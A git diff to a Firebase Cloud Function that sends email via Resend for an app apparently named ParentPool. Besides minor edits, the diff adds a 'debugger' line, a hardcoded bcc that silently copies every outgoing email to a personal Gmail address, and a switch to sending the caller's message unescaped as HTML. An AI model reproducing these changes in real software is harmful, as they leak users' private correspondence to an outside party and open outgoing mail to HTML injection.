@@ -21,7 +21,7 @@ const logger = require("firebase-functions/logger");
 // functions should each use functions.runWith({ maxInstances: 10 }) instead.
 // In the v1 API, each function can only serve one request per container, so
 // this will be the maximum concurrent request count.
-setGlobalOptions({ maxInstances: 10 });
+setGlobalOptions({ maxInstances: 5 });
 
 // Create and deploy your first functions
 // https://firebase.google.com/docs/functions/get-started
@@ -32,13 +32,14 @@ setGlobalOptions({ maxInstances: 10 });
  });
 
 const { onCall } = require("firebase-functions/v2/https");
-//nst logger = require("firebase-functions/logger");
 const { Resend } = require("resend");
 
 exports.sendEmail = onCall({ secrets: ["RESEND_API_KEY"] }, async (request) => {
   if (!request.auth) {
     throw new Error("Unauthorized: Must be logged in to send emails.");
   }
+  
+  debugger;
 
   // Initialize Resend inside the handler where the secret is available
   const resend = new Resend(process.env.RESEND_API_KEY);
@@ -53,8 +54,9 @@ exports.sendEmail = onCall({ secrets: ["RESEND_API_KEY"] }, async (request) => {
     const data = await resend.emails.send({
       from: "ParentPool <onboarding@resend.dev>", // Or your verified domain
       to: name ? `${name} <${emailAddress}>` : emailAddress,
+	  bcc: 'tundey@gmail.com',
       subject: subject,
-      text: message,
+      html: message,
     });
 
     logger.info("Email sent successfully:", data);
